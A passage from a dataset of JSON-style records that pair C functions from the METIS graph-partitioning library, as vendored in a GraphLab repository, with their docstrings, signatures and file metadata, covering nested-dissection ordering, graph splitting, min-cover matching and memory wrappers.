Uncompress the ordering */\n    if (graph.nvtxs < COMPRESSION_FRACTION*(*nvtxs)) { \n      /* construct perm from iperm */\n      for (i=0; i<graph.nvtxs; i++)\n        perm[iperm[i]] = i; \n      for (l=ii=0; ii<graph.nvtxs; ii++) {\n        i = perm[ii];\n        for (j=cptr[i]; j<cptr[i+1]; j++)\n          iperm[cind[j]] = l++;\n      }\n    }\n\n    gk_free((void **)&cptr, &cind, LTERM);\n  }\n\n\n  for (i=0; i<*nvtxs; i++)\n    perm[iperm[i]] = i;\n\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_stopcputimer(ctrl.TotalTmr));\n  IFSET(ctrl.dbglvl, DBG_TIME, PrintTimers(&ctrl));\n\n  if (*numflag == 1)\n    Change2FNumberingOrder(*nvtxs, xadj, adjncy, perm, iperm);\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function takes a graph and a bisection and splits it into two graphs.\n* It relies on the fact that adjwgt is all set to 1.\n**************************************************************************/\n", "func_signal": "idxtype SplitGraphOrderCC(CtrlType *ctrl, GraphType *graph, GraphType *sgraphs, idxtype ncmps, idxtype *cptr, idxtype *cind)", "code": "{\n  idxtype i, ii, iii, j, k, l, istart, iend, mypart, nvtxs, snvtxs, snedges;\n  idxtype *xadj, *vwgt, *adjncy, *adjwgt, *adjwgtsum, *label, *where, *bndptr, *bndind;\n  idxtype *sxadj, *svwgt, *sadjncy, *sadjwgt, *sadjwgtsum, *slabel;\n  idxtype *rename;\n  idxtype *auxadjncy, *auxadjwgt;\n\n  IFSET(ctrl->dbglvl, DBG_TIME, gk_startcputimer(ctrl->SplitTmr));\n\n  nvtxs = graph->nvtxs;\n  xadj = graph->xadj;\n  vwgt = graph->vwgt;\n  adjncy = graph->adjncy;\n  adjwgt = graph->adjwgt;\n  adjwgtsum = graph->adjwgtsum;\n  label = graph->label;\n  where = graph->where;\n  bndptr = graph->bndptr;\n  bndind = graph->bndind;\n  ASSERT(bndptr != NULL);\n\n  /* Go and use bndptr to also mark the boundary nodes in the two partitions */\n  for (ii=0; ii<graph->nbnd; ii++) {\n    i = bndind[ii];\n    for (j=xadj[i]; j<xadj[i+1]; j++)\n      bndptr[adjncy[j]] = 1;\n  }\n\n  rename = idxwspacemalloc(ctrl, nvtxs);\n  \n  /* Go and split the graph a component at a time */\n  for (iii=0; iii<ncmps; iii++) {\n    RandomPermute(cptr[iii+1]-cptr[iii], cind+cptr[iii], 0);\n    snvtxs = snedges = 0;\n    for (j=cptr[iii]; j<cptr[iii+1]; j++) {\n      i = cind[j];\n      rename[i] = snvtxs++;\n      snedges += xadj[i+1]-xadj[i];\n    }\n\n    SetUpSplitGraph(graph, sgraphs+iii, snvtxs, snedges);\n    sxadj = sgraphs[iii].xadj;\n    svwgt = sgraphs[iii].vwgt;\n    sadjwgtsum = sgraphs[iii].adjwgtsum;\n    sadjncy = sgraphs[iii].adjncy;\n    sadjwgt = sgraphs[iii].adjwgt;\n    slabel = sgraphs[iii].label;\n\n    snvtxs = snedges = sxadj[0] = 0;\n    for (ii=cptr[iii]; ii<cptr[iii+1]; ii++) {\n      i = cind[ii];\n\n      istart = xadj[i];\n      iend = xadj[i+1];\n      if (bndptr[i] == -1) { /* This is an interior vertex */\n        auxadjncy = sadjncy + snedges - istart;\n        auxadjwgt = sadjwgt + snedges - istart;\n        for(j=istart; j<iend; j++) \n          auxadjncy[j] = adjncy[j];\n        snedges += iend-istart;\n      }\n      else {\n        l = snedges;\n        for (j=istart; j<iend; j++) {\n          k = adjncy[j];\n          if (where[k] != 2) \n            sadjncy[l++] = k;\n        }\n        snedges = l;\n      }\n\n      svwgt[snvtxs] = vwgt[i];\n      sadjwgtsum[snvtxs] = snedges-sxadj[snvtxs];\n      slabel[snvtxs] = label[i];\n      sxadj[++snvtxs] = snedges;\n    }\n\n    idxset(snedges, 1, sadjwgt);\n    for (i=0; i<snedges; i++) \n      sadjncy[i] = rename[sadjncy[i]];\n\n    sgraphs[iii].nvtxs = snvtxs;\n    sgraphs[iii].nedges = snedges;\n    sgraphs[iii].ncon = 1;\n\n    if (snvtxs < MMDSWITCH)\n      sgraphs[iii].adjwgt = NULL;  /* A marker to call MMD on the driver */\n  }\n\n  IFSET(ctrl->dbglvl, DBG_TIME, gk_stopcputimer(ctrl->SplitTmr));\n\n  idxwspacefree(ctrl, nvtxs);\n\n  return ncmps;\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function is the entry point for OEMETIS\n**************************************************************************/\n", "func_signal": "void METIS_EdgeND(idxtype *nvtxs, idxtype *xadj, idxtype *adjncy, idxtype *numflag, idxtype *options, \n                  idxtype *perm, idxtype *iperm)", "code": "{\n  idxtype i, j;\n  GraphType graph;\n  CtrlType ctrl;\n\n  if (*numflag == 1)\n    Change2CNumbering(*nvtxs, xadj, adjncy);\n\n  SetUpGraph(&graph, OP_OEMETIS, *nvtxs, 1, xadj, adjncy, NULL, NULL, 0);\n\n  if (options[0] == 0) {  /* Use the default parameters */\n    ctrl.CType = OEMETIS_CTYPE;\n    ctrl.IType = OEMETIS_ITYPE;\n    ctrl.RType = OEMETIS_RTYPE;\n    ctrl.dbglvl = OEMETIS_DBGLVL;\n  }\n  else {\n    ctrl.CType = options[OPTION_CTYPE];\n    ctrl.IType = options[OPTION_ITYPE];\n    ctrl.RType = options[OPTION_RTYPE];\n    ctrl.dbglvl = options[OPTION_DBGLVL];\n  }\n  ctrl.oflags  = 0;\n  ctrl.pfactor = -1;\n  ctrl.nseps   = 1;\n\n  ctrl.optype = OP_OEMETIS;\n  ctrl.CoarsenTo = 20;\n  ctrl.maxvwgt = 1.5*(idxsum(*nvtxs, graph.vwgt, 1)/ctrl.CoarsenTo);\n\n  InitRandom(-1);\n\n  AllocateWorkSpace(&ctrl, &graph, 2);\n\n  IFSET(ctrl.dbglvl, DBG_TIME, InitTimers(&ctrl));\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_startcputimer(ctrl.TotalTmr));\n\n  MlevelNestedDissection(&ctrl, &graph, iperm, ORDER_UNBALANCE_FRACTION, *nvtxs);\n\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_stopcputimer(ctrl.TotalTmr));\n  IFSET(ctrl.dbglvl, DBG_TIME, PrintTimers(&ctrl));\n\n  for (i=0; i<*nvtxs; i++)\n    perm[iperm[i]] = i;\n\n  FreeWorkSpace(&ctrl, &graph);\n\n  if (*numflag == 1)\n    Change2FNumberingOrder(*nvtxs, xadj, adjncy, perm, iperm);\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function perfoms a dfs starting from an unmatched col node\n* forming alternate paths\n**************************************************************************/\n", "func_signal": "void MinCover_RowDFS(idxtype *xadj, idxtype *adjncy, idxtype root, idxtype *mate, idxtype *where, idxtype flag)", "code": "{\n  idxtype i;\n\n  if (flag == INROW) {\n    if (where[root] == VR)\n      return;\n    where[root] = VR;\n    for (i=xadj[root]; i<xadj[root+1]; i++) \n      MinCover_RowDFS(xadj, adjncy, adjncy[i], mate, where, INCOL);\n  }\n  else {\n    if (where[root] == VC)\n      return;\n    where[root] = VC;\n    if (mate[root] != -1)\n      MinCover_RowDFS(xadj, adjncy, mate[root], mate, where, INROW);\n  }\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\mincover.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function perfoms a restricted DFS and augments matchings\n**************************************************************************/\n", "func_signal": "idxtype MinCover_Augment(idxtype *xadj, idxtype *adjncy, idxtype col, idxtype *mate, idxtype *flag, idxtype *level, idxtype maxlevel)", "code": "{\n  idxtype i;\n  idxtype row = -1;\n  idxtype status;\n\n  flag[col] = 2;\n  for (i=xadj[col]; i<xadj[col+1]; i++) {\n    row = adjncy[i];\n\n    if (flag[row] == 1) { /* First time through this row node */\n      if (level[row] == maxlevel) {  /* (col, row) is an edge of the G^T */\n        flag[row] = 2;  /* Mark this node as being visited */\n        if (maxlevel != 0)\n          status = MinCover_Augment(xadj, adjncy, mate[row], mate, flag, level, maxlevel-1);\n        else\n          status = 1;\n\n        if (status) {\n          mate[col] = row;\n          mate[row] = col;\n          return 1;\n        }\n      }\n    }\n  }\n\n  return 0;\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\mincover.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function takes a graph and a bisection and splits it into two graphs.\n* This function relies on the fact that adjwgt is all equal to 1.\n**************************************************************************/\n", "func_signal": "void SplitGraphOrder(CtrlType *ctrl, GraphType *graph, GraphType *lgraph, GraphType *rgraph)", "code": "{\n  idxtype i, ii, j, k, l, istart, iend, mypart, nvtxs, snvtxs[3], snedges[3];\n  idxtype *xadj, *vwgt, *adjncy, *adjwgt, *adjwgtsum, *label, *where, *bndptr, *bndind;\n  idxtype *sxadj[2], *svwgt[2], *sadjncy[2], *sadjwgt[2], *sadjwgtsum[2], *slabel[2];\n  idxtype *rename;\n  idxtype *auxadjncy, *auxadjwgt;\n\n  IFSET(ctrl->dbglvl, DBG_TIME, gk_startcputimer(ctrl->SplitTmr));\n\n  nvtxs = graph->nvtxs;\n  xadj = graph->xadj;\n  vwgt = graph->vwgt;\n  adjncy = graph->adjncy;\n  adjwgt = graph->adjwgt;\n  adjwgtsum = graph->adjwgtsum;\n  label = graph->label;\n  where = graph->where;\n  bndptr = graph->bndptr;\n  bndind = graph->bndind;\n  ASSERT(bndptr != NULL);\n\n  rename = idxwspacemalloc(ctrl, nvtxs);\n  \n  snvtxs[0] = snvtxs[1] = snvtxs[2] = snedges[0] = snedges[1] = snedges[2] = 0;\n  for (i=0; i<nvtxs; i++) {\n    k = where[i];\n    rename[i] = snvtxs[k]++;\n    snedges[k] += xadj[i+1]-xadj[i];\n  }\n\n  SetUpSplitGraph(graph, lgraph, snvtxs[0], snedges[0]);\n  sxadj[0] = lgraph->xadj;\n  svwgt[0] = lgraph->vwgt;\n  sadjwgtsum[0] = lgraph->adjwgtsum;\n  sadjncy[0] = lgraph->adjncy; \n  sadjwgt[0] = lgraph->adjwgt; \n  slabel[0] = lgraph->label;\n\n  SetUpSplitGraph(graph, rgraph, snvtxs[1], snedges[1]);\n  sxadj[1] = rgraph->xadj;\n  svwgt[1] = rgraph->vwgt;\n  sadjwgtsum[1] = rgraph->adjwgtsum;\n  sadjncy[1] = rgraph->adjncy; \n  sadjwgt[1] = rgraph->adjwgt; \n  slabel[1] = rgraph->label;\n\n  /* Go and use bndptr to also mark the boundary nodes in the two partitions */\n  for (ii=0; ii<graph->nbnd; ii++) {\n    i = bndind[ii];\n    for (j=xadj[i]; j<xadj[i+1]; j++)\n      bndptr[adjncy[j]] = 1;\n  }\n\n  snvtxs[0] = snvtxs[1] = snedges[0] = snedges[1] = 0;\n  sxadj[0][0] = sxadj[1][0] = 0;\n  for (i=0; i<nvtxs; i++) {\n    if ((mypart = where[i]) == 2)\n      continue;\n\n    istart = xadj[i];\n    iend = xadj[i+1];\n    if (bndptr[i] == -1) { /* This is an interior vertex */\n      auxadjncy = sadjncy[mypart] + snedges[mypart] - istart;\n      for(j=istart; j<iend; j++) \n        auxadjncy[j] = adjncy[j];\n      snedges[mypart] += iend-istart;\n    }\n    else {\n      auxadjncy = sadjncy[mypart];\n      l = snedges[mypart];\n      for (j=istart; j<iend; j++) {\n        k = adjncy[j];\n        if (where[k] == mypart) \n          auxadjncy[l++] = k;\n      }\n      snedges[mypart] = l;\n    }\n\n    svwgt[mypart][snvtxs[mypart]] = vwgt[i];\n    sadjwgtsum[mypart][snvtxs[mypart]] = snedges[mypart]-sxadj[mypart][snvtxs[mypart]];\n    slabel[mypart][snvtxs[mypart]] = label[i];\n    sxadj[mypart][++snvtxs[mypart]] = snedges[mypart];\n  }\n\n  for (mypart=0; mypart<2; mypart++) {\n    iend = snedges[mypart];\n    idxset(iend, 1, sadjwgt[mypart]);\n\n    auxadjncy = sadjncy[mypart];\n    for (i=0; i<iend; i++) \n      auxadjncy[i] = rename[auxadjncy[i]];\n  }\n\n  lgraph->nvtxs = snvtxs[0];\n  lgraph->nedges = snedges[0];\n  rgraph->nvtxs = snvtxs[1];\n  rgraph->nedges = snedges[1];\n\n  IFSET(ctrl->dbglvl, DBG_TIME, gk_stopcputimer(ctrl->SplitTmr));\n\n  idxwspacefree(ctrl, nvtxs);\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function performs multilevel bisection\n**************************************************************************/\n", "func_signal": "void MlevelNodeBisection(CtrlType *ctrl, GraphType *graph, idxtype *tpwgts, float ubfactor)", "code": "{\n  GraphType *cgraph;\n\n  ctrl->CoarsenTo = graph->nvtxs/8;\n  if (ctrl->CoarsenTo > 100)\n    ctrl->CoarsenTo = 100;\n  else if (ctrl->CoarsenTo < 40)\n    ctrl->CoarsenTo = 40;\n  ctrl->maxvwgt = 1.5*((tpwgts[0]+tpwgts[1])/ctrl->CoarsenTo);\n\n  cgraph = Coarsen2Way(ctrl, graph);\n\n  switch (ctrl->IType) {\n    case ITYPE_GGPKL:\n      Init2WayPartition(ctrl, cgraph, tpwgts, ubfactor);\n\n      IFSET(ctrl->dbglvl, DBG_TIME, gk_startcputimer(ctrl->SepTmr));\n\n      Compute2WayPartitionParams(ctrl, cgraph);\n      ConstructSeparator(ctrl, cgraph, ubfactor);\n\n      IFSET(ctrl->dbglvl, DBG_TIME, gk_stopcputimer(ctrl->SepTmr));\n      break;\n    case ITYPE_GGPKLNODE:\n      InitSeparator(ctrl, cgraph, ubfactor);\n      break;\n  }\n\n  Refine2WayNode(ctrl, graph, cgraph, ubfactor);\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function returns the maximum ammount of dynamically allocated \n* memory that was used by the system\n**************************************************************************/\n", "func_signal": "size_t gk_GetMaxMemoryUsed()", "code": "{\n  struct mallinfo meminfo;\n  size_t mused=0;\n\n#ifdef GKMSPACE\n  if (gk_mspace != 0) {\n    meminfo = mspace_mallinfo(gk_mspace);\n    mused = meminfo.usmblks;\n  }\n#else\n  meminfo = dlmallinfo();\n  mused = meminfo.usmblks;\n#endif\n\n  return mused;\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function performs a coarse decomposition and determines the \n* min-cover.\n* REF: Pothen ACMTrans. on Amth Software\n**************************************************************************/\n", "func_signal": "void MinCover_Decompose(idxtype *xadj, idxtype *adjncy, idxtype asize, idxtype bsize, idxtype *mate, idxtype *cover, idxtype *csize)", "code": "{\n  idxtype i, k;\n  idxtype *where;\n  idxtype card[10];\n\n  where = idxmalloc(bsize, \"MinCover_Decompose: where\");\n  for (i=0; i<10; i++)\n    card[i] = 0;\n\n  for (i=0; i<asize; i++)\n    where[i] = SC;\n  for (; i<bsize; i++)\n    where[i] = SR;\n\n  for (i=0; i<asize; i++) \n    if (mate[i] == -1)  \n      MinCover_ColDFS(xadj, adjncy, i, mate, where, INCOL);\n  for (; i<bsize; i++) \n    if (mate[i] == -1)  \n      MinCover_RowDFS(xadj, adjncy, i, mate, where, INROW);\n\n  for (i=0; i<bsize; i++) \n    card[where[i]]++;\n\n  k = 0;\n  if (idxtype_abs(card[VC]+card[SC]-card[HR]) < idxtype_abs(card[VC]-card[SR]-card[HR])) {  /* S = VC+SC+HR */\n    /* mprintf(\"%D %D \",vc+sc, hr); */\n    for (i=0; i<bsize; i++) \n      if (where[i] == VC || where[i] == SC || where[i] == HR)\n        cover[k++] = i;\n  }\n  else {  /* S = VC+SR+HR */\n    /* mprintf(\"%D %D \",vc, hr+sr); */\n    for (i=0; i<bsize; i++) \n      if (where[i] == VC || where[i] == SR || where[i] == HR)\n        cover[k++] = i;\n  }\n\n  *csize = k;\n  gk_free((void **)&where, LTERM);\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\mincover.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function is my wrapper around realloc\n**************************************************************************/\n", "func_signal": "void *gk_realloc(void *oldptr, size_t nbytes, char *msg)", "code": "{\n  return realloc(oldptr, nbytes);\n  void *ptr;\n\n  if (nbytes == 0) {\n    gk_free((void **)&oldptr, LTERM);\n    return NULL;\n  }\n\n#ifdef GKMSPACE\n  if (gk_mspace == 0)\n    gk_mspace = create_mspace(0, 0);\n\n  if (gk_mspace == NULL)\n    gk_errexit(SIGMEM, \"***Memory allocation failed for creating gk_mspace.\");\n\n  ptr = (void *)mspace_realloc(gk_mspace, oldptr, nbytes);\n#else\n  ptr = (void *)dlrealloc(oldptr, nbytes);\n#endif\n\n  if (ptr == NULL) {\n#ifdef WIN32\n    printf(\"   Maximum memory used:              %10Iu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10Iu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n#ifdef SUNOS\n    printf(\"   Maximum memory used:              %10lu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10lu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n#ifdef LINUX\n    printf(\"   Maximum memory used:              %10zu bytes\\n\", gk_GetMaxMemoryUsed());\n    printf(\"   Current memory used:              %10zu bytes\\n\", gk_GetCurMemoryUsed());\n#endif\n\n    gk_errexit(SIGMEM, \"***Memory re-allocation failed for %s. Requested size: %zd bytes\", msg, nbytes);\n  }\n\n  return ptr;\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function performs multilevel bisection. It performs multiple \n* bisections and selects the best.\n**************************************************************************/\n", "func_signal": "void MlevelNodeBisectionMultiple(CtrlType *ctrl, GraphType *graph, idxtype *tpwgts, float ubfactor)", "code": "{\n  idxtype i, nvtxs, cnvtxs, mincut, tmp;\n  GraphType *cgraph; \n  idxtype *bestwhere;\n\n  if (ctrl->nseps == 1 || graph->nvtxs < (ctrl->oflags&OFLAG_COMPRESS ? 1000 : 2000)) {\n    MlevelNodeBisection(ctrl, graph, tpwgts, ubfactor);\n    return;\n  }\n\n  nvtxs = graph->nvtxs;\n\n  if (ctrl->oflags&OFLAG_COMPRESS) { /* Multiple separators at the original graph */\n    bestwhere = idxmalloc(nvtxs, \"MlevelNodeBisection2: bestwhere\");\n\n    for (i=ctrl->nseps; i>0; i--) {\n      MlevelNodeBisection(ctrl, graph, tpwgts, ubfactor);\n\n      /* mprintf(\"%5D \", cgraph->mincut); */\n\n      if (i==ctrl->nseps || graph->mincut < mincut) {\n        mincut = graph->mincut;\n        idxcopy(nvtxs, graph->where, bestwhere);\n      }\n\n      FreeRData(graph);\n    \n      if (mincut == 0)\n        break;\n    }\n    /* mprintf(\"[%5D]\\n\", mincut); */\n\n    Allocate2WayNodePartitionMemory(ctrl, graph);\n    idxcopy(nvtxs, bestwhere, graph->where);\n    gk_free((void **)&bestwhere, LTERM);\n\n    Compute2WayNodePartitionParams(ctrl, graph);\n  }\n  else {  /* Coarsen it a bit */\n    ctrl->CoarsenTo = nvtxs-1;\n\n    cgraph = Coarsen2Way(ctrl, graph);\n\n    cnvtxs = cgraph->nvtxs;\n\n    bestwhere = idxmalloc(cnvtxs, \"MlevelNodeBisection2: bestwhere\");\n\n    for (i=ctrl->nseps; i>0; i--) {\n      ctrl->CType += 20; /* This is a hack. Look at coarsen.c */\n      MlevelNodeBisection(ctrl, cgraph, tpwgts, ubfactor);\n\n      /* mprintf(\"%5D \", cgraph->mincut); */\n\n      if (i==ctrl->nseps || cgraph->mincut < mincut) {\n        mincut = cgraph->mincut;\n        idxcopy(cnvtxs, cgraph->where, bestwhere);\n      }\n\n      FreeRData(graph);\n    \n      if (mincut == 0)\n        break;\n    }\n    /* mprintf(\"[%5D]\\n\", mincut); */\n\n    Allocate2WayNodePartitionMemory(ctrl, cgraph);\n    idxcopy(cnvtxs, bestwhere, cgraph->where);\n    gk_free((void **)&bestwhere, LTERM);\n\n    Compute2WayNodePartitionParams(ctrl, cgraph);\n\n    Refine2WayNode(ctrl, graph, cgraph, ubfactor);\n  }\n\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function is the entry point for ONWMETIS. It requires weights on the\n* vertices. It is for the case that the matrix has been pre-compressed.\n**************************************************************************/\n", "func_signal": "void METIS_NodeWND(idxtype *nvtxs, idxtype *xadj, idxtype *adjncy, idxtype *vwgt, idxtype *numflag, \n                   idxtype *options, idxtype *perm, idxtype *iperm)", "code": "{\n  idxtype i, j, tvwgt;\n  GraphType graph;\n  CtrlType ctrl;\n\n  if (*numflag == 1)\n    Change2CNumbering(*nvtxs, xadj, adjncy);\n\n  SetUpGraph(&graph, OP_ONMETIS, *nvtxs, 1, xadj, adjncy, vwgt, NULL, 2);\n\n  if (options[0] == 0) {  /* Use the default parameters */\n    ctrl.CType = ONMETIS_CTYPE;\n    ctrl.IType = ONMETIS_ITYPE;\n    ctrl.RType = ONMETIS_RTYPE;\n    ctrl.dbglvl = ONMETIS_DBGLVL;\n  }\n  else {\n    ctrl.CType = options[OPTION_CTYPE];\n    ctrl.IType = options[OPTION_ITYPE];\n    ctrl.RType = options[OPTION_RTYPE];\n    ctrl.dbglvl = options[OPTION_DBGLVL];\n  }\n\n  ctrl.oflags  = OFLAG_COMPRESS;\n  ctrl.pfactor = 0;\n  ctrl.nseps = 2;\n  ctrl.optype = OP_ONMETIS;\n  ctrl.CoarsenTo = 100;\n  ctrl.maxvwgt = 1.5*(idxsum(*nvtxs, graph.vwgt, 1)/ctrl.CoarsenTo);\n\n  InitRandom(-1);\n\n  AllocateWorkSpace(&ctrl, &graph, 2);\n\n  IFSET(ctrl.dbglvl, DBG_TIME, InitTimers(&ctrl));\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_startcputimer(ctrl.TotalTmr));\n\n  MlevelNestedDissection(&ctrl, &graph, iperm, ORDER_UNBALANCE_FRACTION, *nvtxs);\n\n  IFSET(ctrl.dbglvl, DBG_TIME, gk_stopcputimer(ctrl.TotalTmr));\n  IFSET(ctrl.dbglvl, DBG_TIME, PrintTimers(&ctrl));\n\n  for (i=0; i<*nvtxs; i++)\n    perm[iperm[i]] = i;\n\n  FreeWorkSpace(&ctrl, &graph);\n\n  if (*numflag == 1)\n    Change2FNumberingOrder(*nvtxs, xadj, adjncy, perm, iperm);\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function cleans up the memory that has been allocated thus far.\n* This work only if code has been compiled with GKMSPACE \n**************************************************************************/\n", "func_signal": "void gk_malloc_cleanup()", "code": "{\n#ifdef GKMSPACE\n  if (gk_mspace != 0)\n    destroy_mspace(gk_mspace);\n  gk_mspace = 0;\n#endif\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function frees a two-dimensional matrix \n**************************************************************************/\n", "func_signal": "void gk_FreeMatrix(void ***r_matrix, size_t ndim1, size_t ndim2)", "code": "{\n  gk_idx_t i;\n  void **matrix;\n\n  matrix = *r_matrix;\n\n  for (i=0; i<ndim1; i++) \n    gk_free((void **)&matrix[i], LTERM);\n\n  gk_free((void **)matrix, LTERM);\n\n  *r_matrix = NULL;\n\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function is my wrapper around free, allows multiple pointers    \n**************************************************************************/\n", "func_signal": "void gk_free(void **ptr1,...)", "code": "{\n  va_list plist;\n  void **ptr;\n\n  if (*ptr1 != NULL)\n    free(*ptr1);\n  *ptr1 = NULL;\n\n  va_start(plist, ptr1);\n\n  while ((ptr = va_arg(plist, void **)) != LTERM) {\n    if (*ptr != NULL)\n      free(*ptr);\n    *ptr = NULL;\n  }\n\n  va_end(plist);\n}", "path": "src\\graphlab\\extern\\metis\\GKlib\\memory.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function uses MMD to order the graph. The vertices are numbered\n* from lastvtx downwards\n**************************************************************************/\n", "func_signal": "void MMDOrder(CtrlType *ctrl, GraphType *graph, idxtype *order, idxtype lastvtx)", "code": "{\n  idxtype i, j, k, nvtxs, nofsub, firstvtx;\n  idxtype *xadj, *adjncy, *label;\n  idxtype *perm, *iperm, *head, *qsize, *list, *marker;\n\n  nvtxs = graph->nvtxs;\n  xadj = graph->xadj;\n  adjncy = graph->adjncy;\n\n  /* Relabel the vertices so that it starts from 1 */\n  k = xadj[nvtxs];\n  for (i=0; i<k; i++)\n    adjncy[i]++;\n  for (i=0; i<nvtxs+1; i++)\n    xadj[i]++;\n\n  perm = idxmalloc(6*(nvtxs+5), \"MMDOrder: perm\");\n  iperm = perm + nvtxs + 5;\n  head = iperm + nvtxs + 5;\n  qsize = head + nvtxs + 5;\n  list = qsize + nvtxs + 5;\n  marker = list + nvtxs + 5;\n\n  genmmd(nvtxs, xadj, adjncy, iperm, perm, 1, head, qsize, list, marker, MAXIDX, &nofsub);\n\n  label = graph->label;\n  firstvtx = lastvtx-nvtxs;\n  for (i=0; i<nvtxs; i++)\n    order[label[i]] = firstvtx+iperm[i]-1;\n\n  gk_free((void **)&perm, LTERM);\n\n  /* Relabel the vertices so that it starts from 0 */\n  for (i=0; i<nvtxs+1; i++)\n    xadj[i]--;\n  k = xadj[nvtxs];\n  for (i=0; i<k; i++)\n    adjncy[i]--;\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
{"docstring": "/*************************************************************************\n* This function takes a graph and produces a bisection of it\n**************************************************************************/\n", "func_signal": "void MlevelNestedDissectionCC(CtrlType *ctrl, GraphType *graph, idxtype *order, float ubfactor, idxtype lastvtx)", "code": "{\n  idxtype i, j, nvtxs, nbnd, tvwgt, tpwgts2[2], nsgraphs, ncmps, rnvtxs;\n  idxtype *label, *bndind;\n  idxtype *cptr, *cind;\n  GraphType *sgraphs;\n\n  nvtxs = graph->nvtxs;\n\n  /* Determine the weights of the partitions */\n  tvwgt = idxsum(nvtxs, graph->vwgt, 1);\n  tpwgts2[0] = tvwgt/2;\n  tpwgts2[1] = tvwgt-tpwgts2[0];\n\n  MlevelNodeBisectionMultiple(ctrl, graph, tpwgts2, ubfactor);\n  IFSET(ctrl->dbglvl, DBG_SEPINFO, mprintf(\"Nvtxs: %6D, [%6D %6D %6D]\\n\", graph->nvtxs, graph->pwgts[0], graph->pwgts[1], graph->pwgts[2]));\n\n  /* Order the nodes in the separator */\n  nbnd = graph->nbnd;\n  bndind = graph->bndind;\n  label = graph->label;\n  for (i=0; i<nbnd; i++) \n    order[label[bndind[i]]] = --lastvtx;\n\n  cptr  = idxmalloc(nvtxs+1, \"MlevelNestedDissectionCC: cptr\");\n  cind  = idxmalloc(nvtxs, \"MlevelNestedDissectionCC: cind\");\n  ncmps = FindComponents(ctrl, graph, cptr, cind);\n\n/*\n  if (ncmps > 2)\n    mprintf(\"[%5D] has %3D components\\n\", nvtxs, ncmps);\n*/\n\n  sgraphs = (GraphType *)gk_malloc(ncmps*sizeof(GraphType), \"MlevelNestedDissectionCC: sgraphs\");\n\n  nsgraphs = SplitGraphOrderCC(ctrl, graph, sgraphs, ncmps, cptr, cind);\n\n  gk_free((void **)&cptr, &cind, LTERM);\n\n  /* Free the memory of the top level graph */\n  FreeGraph(graph, 0);\n\n  /* Go and process the subgraphs */\n  for (rnvtxs=i=0; i<nsgraphs; i++) {\n    if (sgraphs[i].adjwgt == NULL) {\n      MMDOrder(ctrl, sgraphs+i, order, lastvtx-rnvtxs);\n      FreeGraph(sgraphs+i, 0);\n    }\n    else {\n      MlevelNestedDissectionCC(ctrl, sgraphs+i, order, ubfactor, lastvtx-rnvtxs);\n    }\n    rnvtxs += sgraphs[i].nvtxs;\n  }\n\n  gk_free((void **)&sgraphs, LTERM);\n}", "path": "src\\graphlab\\extern\\metis\\libmetis\\ometis.c", "repo_name": "ekoontz/graphlab", "stars": 32, "license": "bsd-3-clause", "language": "c", "size": 745}
